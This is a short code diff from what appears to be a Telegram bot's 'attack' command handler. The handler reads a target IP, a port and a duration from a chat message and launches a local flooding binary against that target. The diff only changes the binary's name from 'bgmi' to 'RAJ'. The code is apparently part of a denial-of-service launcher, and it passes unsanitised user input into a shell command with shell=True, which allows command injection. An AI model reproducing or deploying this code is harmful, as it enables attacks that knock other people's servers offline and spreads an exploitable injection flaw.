@@ -76,7 +76,7 @@ def attack(message):
     try:
         _, ip, port, duration = message.text.split()
         duration = min(int(duration), 180)
-        command = f"./bgmi {ip} {port} {duration}"
+        command = f"./RAJ {ip} {port} {duration}"
 
         try:
             subprocess.Popen(command, shell=True)
